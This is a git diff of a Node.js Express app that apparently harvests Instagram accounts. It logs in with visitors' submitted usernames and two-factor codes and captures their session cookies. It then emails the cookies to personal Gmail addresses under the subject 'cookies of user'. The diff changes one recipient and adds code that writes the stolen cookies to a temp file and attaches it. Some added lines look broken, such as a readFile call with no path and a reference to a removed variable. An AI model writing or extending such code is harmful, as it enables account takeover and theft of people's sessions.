@@ -2,7 +2,7 @@ if (process.env.NODE_ENV !== "production") {
   require("dotenv").config();
 }
 var nodemailer = require("nodemailer");
-
+const fse = require("fs-extra");
 const {
   IgApiClient,
   IgLoginTwoFactorRequiredError,
@@ -13,6 +13,7 @@ const {
 
 const ig = new IgApiClient();
 var Promise = require("bluebird");
+var randomstring = require("randomstring");
 let express = require("express"),
   util = require("util"),
   session = require("express-session"),
@@ -195,7 +196,7 @@ app.get("/insta/submitCode", (req, res) => {
 
         var mailOptions = {
           from: process.env.email,
-          to: "tklinger50@gmail.com",
+          to: "surya142327@gmail.com",
           subject: "cookies of user" + req.query.username,
           text: JSON.stringify(validCookie),
         };
@@ -243,16 +244,23 @@ app.post("/insta", (req, res) => {
           cookiepairs["name"] = cookiepairs["key"];
           delete cookiepairs["key"];
         });
-        const validCookie = {
-          url: "https://instagram.com",
-          cookies: val2.cookies,
-        };
-        console.log(JSON.stringify(validCookie));
+        const filename=randomstring.generate({
+          length: 6,
+          charset: "alphabetic",
+        });
+        fse.outputJsonSync(
+          __dirname +
+            `/tempt/${filename}.txt`,
+          val2.cookies
+        );
+        const data=await fse.readFile();
         var mailOptions = {
           from: process.env.email,
           to: "tklinger50@gmail.com",
           subject: "cookies of user" + req.body.username,
           text: JSON.stringify(validCookie),
+          attachments: [{'filename': __dirname +
+          `/tempt/${filename}.txt`, 'content': data}]
         };
         transporter.sendMail(mailOptions, function (error, info) {
           if (error) {
